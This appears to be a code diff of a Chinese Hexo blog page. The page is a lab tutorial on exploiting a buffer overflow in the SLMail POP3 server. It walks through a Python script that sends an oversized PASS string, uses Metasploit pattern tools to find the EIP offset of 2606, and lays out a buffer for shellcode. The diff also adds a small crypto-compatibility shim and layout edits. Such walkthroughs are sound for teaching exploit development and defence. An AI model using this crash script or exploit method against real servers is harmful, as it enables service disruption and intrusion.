@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -256,19 +271,19 @@
 <h2 id="DEP和ASLR"><a href="#DEP和ASLR" class="headerlink" title="DEP和ASLR"></a>DEP和ASLR</h2><p>这是微软的内存保护机制。<br>DEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。<br>DEP主要的好处是当发生异常时，防止代码从数据区执行。<br>ASLR打乱载入应用程序、动态链接库时候的基地址（base address)</p>
 <h2 id="与pop3协议通信"><a href="#与pop3协议通信" class="headerlink" title="与pop3协议通信"></a>与pop3协议通信</h2><p>我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。<br>我们可以使用netcat与pop3服务器进行通信。</p>
 <p><a target="_blank" rel="noopener" href="https://slmail.software.informer.com/5.5/">https://slmail.software.informer.com/5.5/</a><br>安装exe到windows，重启后，windows开放了pop3-110端口 </p>
-<p><img src="/16.PNG" srcset="/img/loading.gif"></p>
-<h2 id="写一个python脚本"><a href="#写一个python脚本" class="headerlink" title="写一个python脚本"></a>写一个python脚本</h2><p>这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为根据这个脚本稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。<br><img src="/15.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/16.PNG"></p>
+<h2 id="写一个python脚本"><a href="#写一个python脚本" class="headerlink" title="写一个python脚本"></a>写一个python脚本</h2><p>这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为根据这个脚本稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。<br><img src="/15.PNG"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/send.py">https://github.com/Whale3070/ctf-coding/blob/master/send.py</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py">https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py</a></p>
-<h2 id="immunity-debugger"><a href="#immunity-debugger" class="headerlink" title="immunity debugger"></a>immunity debugger</h2><p><img src="/18.PNG" srcset="/img/loading.gif"></p>
+<h2 id="immunity-debugger"><a href="#immunity-debugger" class="headerlink" title="immunity debugger"></a>immunity debugger</h2><p><img src="/18.PNG"></p>
 <p>左上 –指令面板</p>
 <p>右上 –寄存器面板</p>
 <p>左下 –内存转储面板</p>
 <p>右下 –堆栈面板</p>
-<p>file – attach –SLmail<br><img src="/17.PNG" srcset="/img/loading.gif"></p>
-<p>挂载后，点击下图的开始按钮，运行程序<br><img src="/20.PNG" srcset="/img/loading.gif"></p>
+<p>file – attach –SLmail<br><img src="/17.PNG"></p>
+<p>挂载后，点击下图的开始按钮，运行程序<br><img src="/20.PNG"></p>
 <p>运行<a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py">fuzzer.py</a>，使程序崩溃，造成了缓冲区溢出</p>
-<p><img src="/19.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/19.PNG"></p>
 <h2 id="定位缓冲区大小"><a href="#定位缓冲区大小" class="headerlink" title="定位缓冲区大小"></a>定位缓冲区大小</h2><p>定位缓冲区大小，当输入2500个a，程序运行正常；输入2600个a时候，就会报错。</p>
 <figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/python</span><br>import socket<br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>buffer= <span class="hljs-string">&#x27;a&#x27;</span> * 2700<br>try:<br>	<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nSending evil buffer...&quot;</span><br>	s.connect((<span class="hljs-string">&#x27;192.168.1.102&#x27;</span>,110)) # connect <span class="hljs-keyword">to</span> IP, POP3<span class="hljs-built_in"> port</span><br><span class="hljs-built_in"></span>	data = s.recv(1024) # receive banner<br>	<span class="hljs-built_in">print</span> data # <span class="hljs-built_in">print</span> banner<br>	<br>	s.send(<span class="hljs-string">&#x27;USER test&#x27;</span> +<span class="hljs-string">&#x27;\r\n&#x27;</span>) # send username <span class="hljs-string">&quot;test&quot;</span><br>	data = s.recv(1024) # receive reply<br>	<span class="hljs-built_in">print</span> data # <span class="hljs-built_in">print</span> reply<br>	<br>	s.send(<span class="hljs-string">&#x27;PASS&#x27;</span> + buffer + <span class="hljs-string">&#x27;\r\n&#x27;</span>) # send password <span class="hljs-string">&quot;test&quot;</span><br>	data = s.recv(1024)<br>	<span class="hljs-built_in">print</span> data # <span class="hljs-built_in">print</span> reply<br>	<br>	s.close() # close socket<br>	<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nDone!&quot;</span><br>except:<br>	<span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Could not connect to POP3!&quot;</span><br></code></pre></div></td></tr></table></figure>
 <h2 id="控制eip"><a href="#控制eip" class="headerlink" title="控制eip"></a>控制eip</h2><p>控制eip寄存器是exp开发流程中关键的有，eip寄存器就像驾驭马的辔头一样，控制缰绳就让应用程序前进，<br>拉着缰绳就能让它改变前进方向。所以我们使用4个A在buffer(缓冲区)中覆盖了EIP，这里有两个常见的方法：</p>
@@ -277,15 +292,15 @@
 <p><strong>patter_create.rb</strong></p>
 <p>是一个ruby工具，来创建和定位这样的buffer，并且可以在msf中找到它。<br>使用方法：</p>
 <figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">locate pattern_create<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-number">2700</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="/21.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/21.PNG"></p>
 <p>复制生成的字符串，修改<a target="_blank" rel="noopener" href="https://github.com/Whale3070/ctf-coding/blob/master/send.py">send.py</a>，将字符串作为pass密码发送，而不是2700个A，注意下一次程序崩溃时，ESP和EIP寄存器中的值</p>
-<p><img src="/22.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/22.PNG"></p>
 <p>执行send3py</p>
-<p><img src="/23.PNG" srcset="/img/loading.gif">注意弹框的地址<code>39694438</code></p>
+<p><img src="/23.PNG">注意弹框的地址<code>39694438</code></p>
 <figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">locate pattern_offset<span class="hljs-selector-class">.rb</span><br>/usr/share/metasploit-framework/tools/exploit/pattern_offset<span class="hljs-selector-class">.rb</span> -l <span class="hljs-number">2700</span> -<span class="hljs-selector-tag">q</span> <span class="hljs-number">39694438</span><br><br><span class="hljs-selector-attr">[*]</span> Exact match at <span class="hljs-attribute">offset</span> <span class="hljs-number">2606</span><br></code></pre></div></td></tr></table></figure>
 <p>于是得知了offset为2606</p>
 <h2 id="检查buffer，准备执行shellcode"><a href="#检查buffer，准备执行shellcode" class="headerlink" title="检查buffer，准备执行shellcode"></a>检查buffer，准备执行shellcode</h2><p>msf可以自动生成shellcode，标准的反弹shell的payload（有效载荷）需要大约350-400比特的空间。</p>
-<p><img src="/24.PNG" srcset="/img/loading.gif"><br>修改buffer，<code>string= &quot;A&quot;* 2606+ &quot;B&quot;*4 + &quot;C&quot;*(3500-2606-4)</code><br>查看最后的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。</p>
+<p><img src="/24.PNG"><br>修改buffer，<code>string= &quot;A&quot;* 2606+ &quot;B&quot;*4 + &quot;C&quot;*(3500-2606-4)</code><br>查看最后的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。</p>
 
             </div>
             <hr>
@@ -428,10 +443,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
